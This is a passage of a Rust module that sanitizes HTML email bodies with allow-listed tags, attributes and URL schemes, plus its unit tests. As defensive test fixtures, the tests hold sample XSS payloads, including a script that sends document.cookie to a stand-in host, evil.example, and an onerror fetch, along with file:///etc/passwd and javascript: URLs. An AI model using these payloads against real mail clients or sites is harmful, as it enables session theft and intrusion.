//! HTML sanitizing (T-030, first half).
//!
//! Turns [`UnsanitizedHtml`] into [`SanitizedHtml`] — the only way to get a
//! `SanitizedHtml` at all is through [`sanitize`]. The policy is built on
//! [`ammonia`], which is itself built on `html5ever` — the same HTML5
//! tree-construction algorithm a real browser (and WebKitGTK) uses. That
//! choice is deliberate and recorded in `docs/plan.md` under T-030: a
//! hand-rolled tokenizer or a regex-based filter parses HTML differently
//! than the renderer that eventually shows it, and that gap is exactly
//! where mXSS lives — the sanitizer sees one tree, the browser "corrects"
//! malformed markup into a different one, and a `<script>` that wasn't a
//! script under the sanitizer's rules is one under the renderer's.
//!
//! Everything below is an **allow-list**: tags, attributes, URL schemes.
//! Nothing is filtered by matching a blocklist of dangerous constructs —
//! anything not explicitly named here does not survive.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};

use crate::css::{sanitize_declaration_list, sanitize_style_blocks};
use crate::hidden::strip_visually_hidden;
use crate::prescan::prescan_images;
use crate::select::inline_image_data;
use crate::UnsanitizedHtml;
use base64::{engine::general_purpose::STANDARD, Engine as _};

/// Above this many bytes of input, [`sanitize`] does not attempt to parse
/// or sanitize at all — it refuses outright (see [`SanitizeReport::oversized_input`]).
///
/// 2 MiB is generously above any legitimate HTML email body: real-world
/// newsletters and marketing HTML run from a few KB to a few hundred KB of
/// markup; inline images are typically referenced by URL, not embedded as
/// `data:` (which this sanitizer strips anyway, so a sender relying on
/// megabytes of base64-inlined images would lose them regardless of this
/// limit). The chosen number matters less than the *policy*: refuse rather
/// than truncate. Truncating a byte string at an arbitrary boundary and
/// then parsing the result is exactly the kind of "parser sees something
/// different from what the sender meant" situation this whole module
/// exists to avoid, and it buys nothing — html5ever's tokenizer already
/// tolerates truncated/malformed input without special-casing size, so
/// truncation would not even make sanitizing cheaper, only riskier to
/// reason about. Refusing is a flat, cheap length check performed *before*
/// any parsing work, so a hostile giant body can't burn CPU either.
pub const DEFAULT_MAX_INPUT_BYTES: usize = 2 * 1024 * 1024;
/// Inline photos are the one attachment class rendered from the cached
/// RFC822 body. Bound each image and the aggregate so a sender cannot turn
/// a message open into an unbounded base64/data-URI allocation.
pub const DEFAULT_MAX_INLINE_IMAGE_BYTES: usize = 8 * 1024 * 1024;
pub const DEFAULT_MAX_INLINE_IMAGES_BYTES: usize = 12 * 1024 * 1024;

/// Caller-controlled sanitizing policy.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SanitizeOptions {
    /// Load `http(s)` images. Default `false` (D44: remote images are not
    /// fetched until the user allows it, per-message or globally). This
    /// has no effect on tracking pixels when [`Self::block_tracking_pixels`]
    /// is `true` — those are blocked either way, see
    /// [`SanitizeReport::blocked_tracking_pixels`].
    pub allow_remote_images: bool,
    /// Strip 1×1 and known-host tracking pixels even when remote images
    /// are allowed. Default `true` (D44). The Privacy toggle "Block
    /// tracking pixels" is the UI for this; turning it off is the only
    /// way a beacon `src` survives, and even then only if remote images
    /// are also allowed — `allow_remote_images = false` still strips
    /// every `http(s)` `src`.
    pub block_tracking_pixels: bool,
    /// Refuse to sanitize input larger than this many bytes. See
    /// [`DEFAULT_MAX_INPUT_BYTES`].
    pub max_input_bytes: usize,
}

impl Default for SanitizeOptions {
    fn default() -> Self {
        SanitizeOptions {
            allow_remote_images: false,
            block_tracking_pixels: true,
            max_input_bytes: DEFAULT_MAX_INPUT_BYTES,
        }
    }
}

/// What [`sanitize`] removed, so the UI can be honest about it (e.g. "images
/// blocked, show them?") instead of silently showing a stripped-down
/// message.
///
/// D14: this type carries only counts and a flag — never message content —
/// so unlike [`UnsanitizedHtml`] it is fine for this one to derive `Debug`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct SanitizeReport {
    /// Remote (`http`/`https`) images removed because `allow_remote_images`
    /// was `false`. Does not include tracking pixels — those are counted
    /// separately below even though they are also remote images.
    pub blocked_remote_images: usize,
    /// Images removed because they look like open/click tracking beacons
    /// (1x1-declared or a known tracker host) — removed unconditionally,
    /// regardless of `allow_remote_images` (D44).
    pub blocked_tracking_pixels: usize,
    /// `cid:` (inline-attachment) image references removed. Not wired to
    /// anything yet — see the module docs on why they can't be rendered
    /// today — counted separately so the UI can eventually say "inline
    /// image not shown" instead of lumping it in with "image blocked".
    pub blocked_cid_images: usize,
    /// `true` if the input exceeded [`SanitizeOptions::max_input_bytes`]
    /// and was not sanitized at all — the returned [`SanitizedHtml`] is
    /// empty in that case. See [`DEFAULT_MAX_INPUT_BYTES`] for why this is
    /// a refusal, not a truncation.
    pub oversized_input: bool,
}

/// Sanitized HTML: the only way to construct this type is [`sanitize`].
///
/// D14: content never appears in `Debug` — only the byte length does. There
/// is intentionally no `Display` impl either, to avoid a second place
/// content could leak into a format string by accident.
#[derive(Clone, PartialEq, Eq)]
pub struct SanitizedHtml(String);

impl SanitizedHtml {
    /// The sanitized HTML, safe to hand to a renderer with JS disabled and
    /// remote loads otherwise blocked by policy (see crate docs — the
    /// second half of T-030, wiring this into WebKitGTK, is not this
    /// crate's job).
    pub fn as_sanitized_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for SanitizedHtml {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SanitizedHtml")
            .field("len", &self.0.len())
            .finish()
    }
}

/// Sanitize `html` per `opts`. See module docs for the allow-list
/// rationale and `docs/plan.md` (T-030) for the fork-in-the-road decisions
/// (blocked-image handling, links, size limit, inline `style`, `cid:`).
pub fn sanitize(html: &UnsanitizedHtml, opts: &SanitizeOptions) -> (SanitizedHtml, SanitizeReport) {
    sanitize_with_inline_map(html, opts, HashMap::new())
}

/// Sanitize an HTML body and resolve safe `cid:` raster images from the
/// same raw MIME message. Arbitrary sender-provided `data:` URLs remain
/// forbidden: only entries decoded here after MIME type, signature and
/// byte-budget checks are turned into a data URI.
pub fn sanitize_message_html(
    html: &UnsanitizedHtml,
    raw_message: &[u8],
    opts: &SanitizeOptions,
) -> (SanitizedHtml, SanitizeReport) {
    let inline = inline_image_data(
        raw_message,
        DEFAULT_MAX_INLINE_IMAGE_BYTES,
        DEFAULT_MAX_INLINE_IMAGES_BYTES,
    )
    .into_iter()
    .map(|(content_id, (mime, bytes))| {
        (
            content_id,
            format!("data:{mime};base64,{}", STANDARD.encode(bytes)),
        )
    })
    .collect();
    sanitize_with_inline_map(html, opts, inline)
}

fn sanitize_with_inline_map(
    html: &UnsanitizedHtml,
    opts: &SanitizeOptions,
    inline_images: HashMap<String, String>,
) -> (SanitizedHtml, SanitizeReport) {
    let raw = html.as_unsanitized_str();

    if raw.len() > opts.max_input_bytes {
        return (
            SanitizedHtml(String::new()),
            SanitizeReport {
                oversized_input: true,
                ..SanitizeReport::default()
            },
        );
    }

    let scan = prescan_images(raw, opts.allow_remote_images);
    let tracker_srcs = if opts.block_tracking_pixels {
        scan.tracker_srcs
    } else {
        HashSet::new()
    };
    let resolved_cid_images = scan
        .cid_image_sources
        .iter()
        .filter(|source| {
            cid_key(source).is_some_and(|content_id| inline_images.contains_key(&content_id))
        })
        .count();
    let report = SanitizeReport {
        blocked_remote_images: scan.remote_image_blocked_count,
        // Only count what this pass actually stripped. Prescan still
        // classifies beacons when the toggle is off, but reporting them
        // as blocked would lie to the "show images" banner.
        blocked_tracking_pixels: if opts.block_tracking_pixels {
            scan.tracking_pixel_count
        } else {
            0
        },
        blocked_cid_images: scan.cid_image_count.saturating_sub(resolved_cid_images),
        oversized_input: false,
    };

    // T-120: drop subtrees the sender hid with inline CSS *before*
    // ammonia strips `style=`. Otherwise a newsletter preheader
    // (`font-size:0` / `display:none`) becomes ordinary visible text.
    // Prescan already ran on the original markup so tracking-pixel
    // counts still include beacons that lived inside those subtrees.
    let stripped = strip_visually_hidden(raw);
    let builder =
        build_sanitizer_with_inline(tracker_srcs, opts.allow_remote_images, inline_images);
    let cleaned = sanitize_style_blocks(&builder.clean(&stripped).to_string());

    (SanitizedHtml(cleaned), report)
}

fn cid_key(value: &str) -> Option<String> {
    let value = value.trim();
    let (scheme, rest) = value.split_once(':')?;
    if !scheme.eq_ignore_ascii_case("cid") {
        return None;
    }
    let key = rest.trim().trim_matches(['<', '>']).trim();
    (!key.is_empty()).then(|| key.to_ascii_lowercase())
}

/// Elements allowed to survive at all. Deliberately explicit rather than
/// `ammonia::Builder::default()`'s tag set, so a future `ammonia` upgrade
/// changing its defaults can't silently change our security posture — and
/// so every entry here is a decision this crate owns and can be reviewed.
///
/// No `script`, `iframe`, `object`, `embed`, `form`/input
/// controls, `base`, `link`, or `meta` (D44). Formatting, structure,
/// tables, images and parsed allow-listed CSS only.
const TAGS: &[&str] = &[
    "a",
    "abbr",
    "acronym",
    "area",
    "article",
    "aside",
    "b",
    "bdi",
    "bdo",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "data",
    "dd",
    "del",
    "details",
    "dfn",
    "div",
    "dl",
    "dt",
    "em",
    "figcaption",
    "figure",
    "footer",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "header",
    "hgroup",
    "hr",
    "i",
    "img",
    "ins",
    "kbd",
    "li",
    "map",
    "mark",
    "nav",
    "ol",
    "p",
    "pre",
    "q",
    "rp",
    "rt",
    "rtc",
    "ruby",
    "s",
    "samp",
    "small",
    "span",
    "strike",
    "strong",
    "style",
    "sub",
    "summary",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "time",
    "tr",
    "tt",
    "u",
    "ul",
    "var",
    "wbr",
];

/// Tags whose contents are dropped along with the tag itself, not merely
/// unwrapped — these never have content worth keeping, and some
/// (`iframe`/`object`/`embed`/`form`) can carry executable or
/// network-fetching behavior in their attributes even though we also
/// exclude those tags from `TAGS` above. Belt and suspenders: if a future
/// edit to `TAGS` ever added one of these by mistake, the content-removal
/// list still keeps its children from leaking into the rendered body as
/// loose text (e.g. `<option>` labels, a `<form>`'s field values).
const CLEAN_CONTENT_TAGS: &[&str] = &[
    "script",
    "noscript",
    "template",
    "svg",
    "math",
    "applet",
    "object",
    "embed",
    "iframe",
    "form",
    "head",
    "title",
    "button",
    "select",
    "textarea",
    // Raw-text elements (HTML5 tokenizer parses their content as literal
    // text, never as markup — same class as `noscript`/`script`/`style`
    // above, just less commonly seen in the wild). Without listing them
    // here, a disallowed `<noembed>`/`<noframes>`/`<xmp>`/`<plaintext>` tag
    // is still stripped by the tag allow-list, but its raw-text body
    // survives as loose, HTML-escaped text — safe (never parsed as an
    // element, never executes), but it shows the reader the literal source
    // of whatever attack payload was stuffed inside as if it were message
    // text. Listed here for the same reason `noscript` already is: drop
    // the payload instead of just defusing and displaying it.
    "noembed",
    "noframes",
    "xmp",
    "plaintext",
];

/// Attributes allowed on any tag. CSS-bearing attributes are retained only
/// because `attribute_filter` parses and narrows `style`; `class` and `id`
/// are inert identifiers used by the equally restricted `<style>` rules.
const GENERIC_ATTRIBUTES: &[&str] = &["class", "id", "lang", "style", "title"];

/// Per-tag attributes, mirroring (and, for `table`, correcting a gap in)
/// `ammonia`'s own conservative defaults — kept explicit for the same
/// reason as `TAGS`. Nothing here is a URL/script/style sink beyond `href`
/// and `src`, both of which go through the URL-scheme allow-list and (for
/// `img`) the extra `attribute_filter` policy below.
///
/// Deliberately **not** here: `cite` on `blockquote`/`q`/`del`/`ins`.
/// `ammonia` only runs its URL-scheme allow-list and `UrlRelative` policy
/// against attributes it recognizes as URLs (`href`, `src`, ...) — `cite`
/// is not one of them, so `javascript:`/`file:`/relative values in `cite`
/// would pass through `attribute_filter` untouched (verified: the base
/// `clean()` pass never even offers `cite` to that callback). `cite` is a
/// citation-source hint no mail client visibly renders or follows, so the
/// fix is to drop it rather than hand-roll a second URL check for one
/// attribute nothing in this crate's UI surfaces. See `docs/plan.md`
/// T-030 for the full writeup (found in review, 2026-08-22).
fn tag_attributes() -> HashMap<&'static str, HashSet<&'static str>> {
    let mut m: HashMap<&'static str, HashSet<&'static str>> = HashMap::new();
    m.insert("a", ["href", "hreflang"].into_iter().collect());
    m.insert("bdo", ["dir"].into_iter().collect());
    m.insert(
        "col",
        ["align", "char", "charoff", "span", "valign", "width"]
            .into_iter()
            .collect(),
    );
    m.insert(
        "colgroup",
        ["align", "char", "charoff", "span", "valign", "width"]
            .into_iter()
            .collect(),
    );
    m.insert("del", ["datetime"].into_iter().collect());
    m.insert("hr", ["align", "size", "width"].into_iter().collect());
    m.insert(
        "img",
        ["align", "alt", "height", "src", "width"]
            .into_iter()
            .collect(),
    );
    m.insert("ins", ["datetime"].into_iter().collect());
    m.insert("ol", ["start"].into_iter().collect());
    m.insert(
        "table",
        [
            "align",
            "bgcolor",
            "border",
            "cellpadding",
            "cellspacing",
            "char",
            "charoff",
            "height",
            "summary",
            "width",
        ]
        .into_iter()
        .collect(),
    );
    for t in ["tbody", "tfoot", "thead", "tr"] {
        m.insert(
            t,
            ["align", "bgcolor", "char", "charoff", "valign"]
                .into_iter()
                .collect(),
        );
    }
    for t in ["td", "th"] {
        let mut attrs: HashSet<&'static str> = [
            "align", "bgcolor", "char", "charoff", "colspan", "headers", "height", "rowspan",
            "valign", "width",
        ]
        .into_iter()
        .collect();
        if t == "th" {
            attrs.insert("scope");
        }
        m.insert(t, attrs);
    }
    m
}

/// URL schemes allowed anywhere a URL attribute (`href`, `src`) is
/// otherwise permitted — `cite` is deliberately not in that set, see the
/// doc comment on `tag_attributes()`. `mailto:` for real "email this address"
/// links; `http`/`https` for links and (subject to the extra `img`
/// policy below) images. Everything else — `javascript:`, `vbscript:`,
/// `data:`, `file:`, `cid:`, and the long tail of schemes `ammonia`
/// defaults to (`tel:`, `sms:`, `geo:`, ...) — is not something an email
/// body needs and is dropped by omission, per the allow-list philosophy:
/// we don't maintain a blocklist of dangerous schemes, we maintain this
/// list of needed ones.
const URL_SCHEMES: &[&str] = &["http", "https", "mailto"];

/// True for any attribute name that looks like a DOM event handler
/// (`onerror`, `onload`, `ONMOUSEOVER`, ...): starts with `on` (either
/// case) and has at least one character after it. This is deliberately a
/// *class* check, not a fixed list of known handler names — HTML keeps
/// adding new `on*` events, and a blocklist of specific names is exactly
/// the kind of incomplete list this crate's whole approach refuses to rely
/// on (see the module docs).
///
/// Every allow-list in this file (`GENERIC_ATTRIBUTES`, `tag_attributes()`)
/// already omits every `on*` name, so in the shipped configuration this
/// function's caller in `build_sanitizer` should never actually see one —
/// this check is the independent second layer that keeps that true even if
/// a future edit to those allow-lists ever added one by accident. See
/// `tests::event_handler_class_guard_survives_an_accidentally_permissive_allow_list`,
/// which calls `build_sanitizer` with a real (temporary, allow-list-only)
/// `onclick` entry to prove this function — not the omission — is what
/// blocks it.
fn is_event_handler_attribute(name: &str) -> bool {
    let bytes = name.as_bytes();
    bytes.len() > 2 && (bytes[0] | 0x20) == b'o' && (bytes[1] | 0x20) == b'n'
}

fn build_sanitizer_with_inline(
    tracker_srcs: HashSet<String>,
    allow_remote_images: bool,
    inline_images: HashMap<String, String>,
) -> ammonia::Builder<'static> {
    build_sanitizer_with_tag_attributes(
        tracker_srcs,
        allow_remote_images,
        tag_attributes(),
        inline_images,
    )
}

fn build_sanitizer_with_tag_attributes(
    tracker_srcs: HashSet<String>,
    allow_remote_images: bool,
    tag_attributes: HashMap<&'static str, HashSet<&'static str>>,
    inline_images: HashMap<String, String>,
) -> ammonia::Builder<'static> {
    let mut builder = ammonia::Builder::new();
    builder
        .tags(TAGS.iter().copied().collect())
        .clean_content_tags(CLEAN_CONTENT_TAGS.iter().copied().collect())
        .tag_attributes(tag_attributes)
        .generic_attributes(GENERIC_ATTRIBUTES.iter().copied().collect())
        .url_schemes(
            URL_SCHEMES
                .iter()
                .copied()
                .chain((!inline_images.is_empty()).then_some("cid"))
                .collect(),
        )
        // Email HTML has no meaningful base URL, and which base (if any)
        // the renderer loads the document against is the *other* half of
        // T-030's decision to make. Rather than pass through a relative
        // `src`/`href` and hope it resolves harmlessly, deny it outright:
        // a definite, renderer-independent policy.
        .url_relative(ammonia::UrlRelative::Deny)
        // JS is off in the renderer (D3) so `target="_blank"` popups
        // aren't a concern the way they are in a normal web page, but
        // `rel` costs nothing and documents the intent: no referrer, no
        // opener handle, no "this sender vouches for that link" signal.
        .link_rel(Some("noopener noreferrer nofollow"))
        .strip_comments(true)
        .attribute_filter(move |tag, attr, value| {
            // `<style>` keeps no attributes at all. Its content is narrowed
            // by `css::sanitize_style_blocks`, a post-pass over ammonia's
            // serialization, and the only thing that makes that pass sound
            // is the tag arriving in one canonical shape. `class`/`id`/
            // `lang`/`title` are inert on `<style>` anyway (nothing selects
            // the stylesheet element itself), so dropping them costs
            // nothing and removes a whole class of parser-mismatch bugs.
            if tag == "style" {
                return None;
            }

            if is_event_handler_attribute(attr) {
                return None;
            }

            if attr == "style" {
                let safe = sanitize_declaration_list(value);
                return (!safe.is_empty()).then_some(Cow::Owned(safe));
            }

            if tag == "img" && attr == "src" {
                if let Some(content_id) = cid_key(value) {
                    return inline_images.get(&content_id).cloned().map(Cow::Owned);
                }
                // `data:` is never accepted from message markup. A data
                // URI can only appear as the owned replacement above.
                if value
                    .split_once(':')
                    .is_some_and(|(scheme, _)| scheme.eq_ignore_ascii_case("data"))
                {
                    return None;
                }
                if tracker_srcs.contains(value) {
                    return None;
                }
                if !allow_remote_images {
                    if let Ok(url) = url::Url::parse(value) {
                        if url.scheme() == "http" || url.scheme() == "https" {
                            return None;
                        }
                    }
                }
            }

            Some(Cow::Borrowed(value))
        });
    builder
}

#[cfg(test)]
mod tests {
    use super::*;

    fn html(s: &str) -> UnsanitizedHtml {
        UnsanitizedHtml::for_test(s.to_string())
    }

    #[test]
    fn script_tag_and_content_removed() {
        let (out, _) = sanitize(
            &html("<p>hi</p><script>evil()</script>"),
            &SanitizeOptions::default(),
        );
        let s = out.as_sanitized_str();
        assert!(!s.to_lowercase().contains("script"));
        assert!(!s.contains("evil"));
        assert!(s.contains("hi"));
    }

    #[test]
    fn onerror_attribute_removed_even_though_tag_kept() {
        let (out, _) = sanitize(
            &html(r#"<img src="https://example.com/a.png" onerror="evil()">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        let s = out.as_sanitized_str();
        assert!(!s.to_lowercase().contains("onerror"));
        assert!(!s.contains("evil"));
    }

    #[test]
    fn javascript_scheme_href_stripped() {
        let (out, _) = sanitize(
            &html(r#"<a href="javascript:evil()">click</a>"#),
            &SanitizeOptions::default(),
        );
        let s = out.as_sanitized_str();
        assert!(!s.to_lowercase().contains("javascript:"));
        assert!(s.contains("click"));
    }

    #[test]
    fn file_scheme_src_stripped() {
        let (out, _) = sanitize(
            &html(r#"<img src="file:///etc/passwd">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        assert!(!out.as_sanitized_str().contains("/etc/passwd"));
    }

    #[test]
    fn acceptance_fixture_script_onerror_tracker_file_all_neutralized() {
        // The exact criterion from docs/plan.md T-030's acceptance line.
        let raw = concat!(
            "<p>Hello</p>",
            "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
            r#"<img src="https://example.com/photo.jpg" onerror="fetch('https://evil.example/x')">"#,
            r#"<img src="https://track.example.com/open.gif" width="1" height="1">"#,
            r#"<img src="file:///etc/passwd">"#,
        );
        let (out, report) = sanitize(
            &html(raw),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        let s = out.as_sanitized_str();
        let lower = s.to_lowercase();
        assert!(!lower.contains("<script"), "script tag survived: {s}");
        assert!(
            !lower.contains("document.cookie"),
            "script body survived: {s}"
        );
        assert!(!lower.contains("onerror"), "onerror survived: {s}");
        assert!(
            !lower.contains("evil.example"),
            "evil.example survived: {s}"
        );
        assert!(!s.contains("/etc/passwd"), "file:// path survived: {s}");
        assert!(
            !s.contains("track.example.com"),
            "tracking pixel src survived even though allow_remote_images=true: {s}"
        );
        assert!(s.contains("Hello"), "legitimate text was lost: {s}");
        assert_eq!(report.blocked_tracking_pixels, 1);
    }

    #[test]
    fn remote_image_blocked_by_default_and_counted() {
        let (out, report) = sanitize(
            &html(r#"<img src="https://example.com/photo.jpg" width="600" height="400">"#),
            &SanitizeOptions::default(),
        );
        assert!(!out.as_sanitized_str().contains("example.com"));
        assert_eq!(report.blocked_remote_images, 1);
        assert_eq!(report.blocked_tracking_pixels, 0);
    }

    #[test]
    fn remote_image_kept_when_allowed_and_not_a_tracker() {
        let (out, report) = sanitize(
            &html(r#"<img src="https://example.com/photo.jpg" width="600" height="400">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        assert!(out.as_sanitized_str().contains("example.com/photo.jpg"));
        assert_eq!(report.blocked_remote_images, 0);
    }

    #[test]
    fn tracking_pixel_blocked_even_when_remote_images_allowed() {
        let (out, report) = sanitize(
            &html(r#"<img src="https://example.com/beacon.gif" width="1" height="1">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        assert!(!out.as_sanitized_str().contains("beacon.gif"));
        assert_eq!(report.blocked_tracking_pixels, 1);
    }

    #[test]
    fn tracking_pixel_survives_only_when_the_block_toggle_is_off_and_remote_images_are_allowed() {
        let (out, report) = sanitize(
            &html(r#"<img src="https://example.com/beacon.gif" width="1" height="1">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                block_tracking_pixels: false,
                ..SanitizeOptions::default()
            },
        );
        assert!(
            out.as_sanitized_str().contains("beacon.gif"),
            "the Privacy toggle is the only way a 1×1 src is allowed to survive: {}",
            out.as_sanitized_str()
        );
        assert_eq!(
            report.blocked_tracking_pixels, 0,
            "the report must not claim a beacon was blocked when the toggle left it in"
        );
    }

    #[test]
    fn cid_image_src_dropped_and_counted_separately() {
        let (out, report) = sanitize(
            &html(r#"<img src="cid:part1.attachment@example.com" alt="inline">"#),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        assert!(!out.as_sanitized_str().contains("cid:"));
        assert_eq!(report.blocked_cid_images, 1);
        assert_eq!(report.blocked_remote_images, 0);
        assert_eq!(report.blocked_tracking_pixels, 0);
    }

    #[test]
    fn cid_photo_is_resolved_only_from_a_bounded_valid_mime_part() {
        let raw = concat!(
            "MIME-Version: 1.0\r\n",
            "Content-Type: multipart/related; boundary=R\r\n\r\n",
            "--R\r\nContent-Type: text/html; charset=utf-8\r\n\r\n",
            "<p>photo</p><img src=\"cid:Photo@One.Test\" alt=\"trip\">\r\n",
            "--R\r\nContent-Type: image/png\r\n",
            "Content-Transfer-Encoding: base64\r\n",
            "Content-ID: <photo@one.test>\r\n",
            "Content-Disposition: inline; filename=photo.png\r\n\r\n",
            // A valid 1x1 PNG. CID images are local content, not a remote
            // tracking request; the byte/signature caps are the boundary.
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\r\n",
            "--R--\r\n",
        );
        let parsed = crate::parse_message(raw.as_bytes(), false);
        let crate::BodyContent::Html(body) = parsed.body else {
            panic!("expected HTML body");
        };
        let (out, report) =
            sanitize_message_html(&body, raw.as_bytes(), &SanitizeOptions::default());
        assert!(out
            .as_sanitized_str()
            .contains("src=\"data:image/png;base64,"));
        assert!(!out.as_sanitized_str().contains("cid:"));
        assert_eq!(report.blocked_cid_images, 0);
    }

    #[test]
    fn sender_data_uri_and_svg_cid_never_cross_the_raster_allowlist() {
        let direct = html(r#"<img src="data:image/png;base64,AAAA">"#);
        let (out, _) = sanitize_message_html(&direct, b"", &SanitizeOptions::default());
        assert!(!out.as_sanitized_str().contains("data:"));

        let raw = concat!(
            "Content-Type: multipart/related; boundary=R\r\n\r\n",
            "--R\r\nContent-Type: text/html\r\n\r\n<img src=\"cid:vector\">\r\n",
            "--R\r\nContent-Type: image/svg+xml\r\nContent-ID: <vector>\r\n\r\n",
            "<svg onload=\"alert(1)\"></svg>\r\n--R--\r\n",
        );
        let parsed = crate::parse_message(raw.as_bytes(), false);
        let crate::BodyContent::Html(body) = parsed.body else {
            panic!("expected HTML body");
        };
        let (out, report) =
            sanitize_message_html(&body, raw.as_bytes(), &SanitizeOptions::default());
        assert!(!out.as_sanitized_str().contains("data:"));
        assert!(!out.as_sanitized_str().contains("cid:"));
        assert_eq!(report.blocked_cid_images, 1);
    }

    #[test]
    fn iframe_object_embed_form_base_link_meta_refresh_all_removed() {
        let raw = concat!(
            r#"<iframe src="https://example.com"></iframe>"#,
            r#"<object data="https://example.com/x.swf"></object>"#,
            r#"<embed src="https://example.com/x.swf">"#,
            r#"<form action="https://example.com/steal"><input name="x"></form>"#,
            r#"<base href="https://evil.example/">"#,
            r#"<link rel="stylesheet" href="https://evil.example/x.css">"#,
            r#"<meta http-equiv="refresh" content="0; url=https://evil.example">"#,
            "<p>survives</p>",
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let lower = out.as_sanitized_str().to_lowercase();
        for tag in [
            "<iframe",
            "<object",
            "<embed",
            "<form",
            "<input",
            "<base",
            "<link",
            "http-equiv",
        ] {
            assert!(!lower.contains(tag), "{tag} survived: {lower}");
        }
        assert!(lower.contains("survives"));
    }

    // `cite` on `blockquote`/`q`/`del`/`ins` is a URL-shaped attribute that
    // `ammonia` does not run through its URL-scheme/relative-URL policy
    // (only attributes it recognizes as URLs, like `href`/`src`, get that
    // treatment) — see the doc comment on `tag_attributes()`. We drop
    // `cite` outright rather than special-case it. One test per tag, on
    // purpose: a single `blockquote`-only test would not catch someone
    // reintroducing `cite` on just `q` (or `del`, or `ins`) tomorrow.
    #[test]
    fn cite_attribute_never_survives_on_blockquote() {
        for value in ["javascript:alert(1)", "file:///etc/passwd", "/relative"] {
            let raw = format!(r#"<blockquote cite="{value}">t</blockquote>"#);
            let (out, _) = sanitize(&html(&raw), &SanitizeOptions::default());
            let lower = out.as_sanitized_str().to_lowercase();
            assert!(
                !lower.contains("cite"),
                "cite survived on blockquote: {lower}"
            );
        }
    }

    #[test]
    fn cite_attribute_never_survives_on_q() {
        for value in ["javascript:alert(1)", "file:///etc/passwd", "/relative"] {
            let raw = format!(r#"<q cite="{value}">t</q>"#);
            let (out, _) = sanitize(&html(&raw), &SanitizeOptions::default());
            let lower = out.as_sanitized_str().to_lowercase();
            assert!(!lower.contains("cite"), "cite survived on q: {lower}");
        }
    }

    #[test]
    fn cite_attribute_never_survives_on_del() {
        for value in ["vbscript:x", "file:///etc/passwd", "/relative"] {
            let raw = format!(r#"<del cite="{value}" datetime="1">t</del>"#);
            let (out, _) = sanitize(&html(&raw), &SanitizeOptions::default());
            let lower = out.as_sanitized_str().to_lowercase();
            assert!(!lower.contains("cite"), "cite survived on del: {lower}");
            // Sanity: this isn't `del` losing all its attributes — `datetime`
            // (which *is* on the allow-list) must still make it through.
            assert!(lower.contains("datetime"));
        }
    }

    #[test]
    fn cite_attribute_never_survives_on_ins() {
        for value in ["javascript:alert(1)", "file:///etc/passwd", "/relative"] {
            let raw = format!(r#"<ins cite="{value}">t</ins>"#);
            let (out, _) = sanitize(&html(&raw), &SanitizeOptions::default());
            let lower = out.as_sanitized_str().to_lowercase();
            assert!(!lower.contains("cite"), "cite survived on ins: {lower}");
        }
    }

    #[test]
    fn raw_text_attack_payload_in_noembed_and_friends_does_not_leak_as_visible_text() {
        // `<plaintext>` is excluded here on purpose: per the HTML5 tokenizer
        // it has no recognized closing tag at all — once it's seen,
        // *everything* to end-of-document becomes its raw-text content, so
        // it gets its own test below rather than eating a shared fixture.
        let raw = concat!(
            "<p>before</p>",
            r#"<noembed><img src=x onerror=alert(1)></noembed>"#,
            r#"<noframes><script>alert(2)</script></noframes>"#,
            r#"<xmp><b>not bold</b></xmp>"#,
            "<p>survives</p>",
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let lower = out.as_sanitized_str().to_lowercase();
        for needle in ["onerror", "alert(1)", "alert(2)", "not bold"] {
            assert!(
                !lower.contains(needle),
                "{needle} leaked into output: {lower}"
            );
        }
        assert!(lower.contains("before"));
        assert!(lower.contains("survives"));
    }

    #[test]
    fn raw_text_attack_payload_in_plaintext_does_not_leak_as_visible_text() {
        let raw = concat!("<p>before</p>", "<plaintext>raw <i>text</i> tail");
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let lower = out.as_sanitized_str().to_lowercase();
        assert!(lower.contains("before"));
        for needle in ["raw", "tail", "<i>text</i>"] {
            assert!(
                !lower.contains(needle),
                "{needle} leaked into output: {lower}"
            );
        }
    }

    #[test]
    fn network_css_in_style_tag_and_attribute_is_dropped() {
        let raw = concat!(
            "<style>@import url('https://evil.example/x.css'); body{background:red}</style>",
            r#"<div style="background: url('https://evil.example/track.gif')">text</div>"#,
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let lower = out.as_sanitized_str().to_lowercase();
        assert!(!lower.contains("@import"));
        assert!(!lower.contains("evil.example"));
        assert!(!lower.contains("url("));
        assert!(
            lower.contains(".fm-message{background:red;}"),
            "safe color shorthand should survive after the import is removed: {lower}"
        );
        assert!(lower.contains("text"));
    }

    #[test]
    fn safe_inline_layout_and_selector_identifiers_survive() {
        let raw = concat!(
            r#"<div id="letter" class="card wide" style="#,
            r#"width:600px;max-width:100%;padding:24px;background-color:#f5f6f8;"#,
            r#"background-image:url(https://tracker.example/p.gif);position:fixed">text</div>"#,
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let safe = out.as_sanitized_str();
        for kept in [
            r#"id="letter""#,
            r#"class="card wide""#,
            "width:600px",
            "max-width:100%",
            "padding:24px",
            "background-color:#f5f6f8",
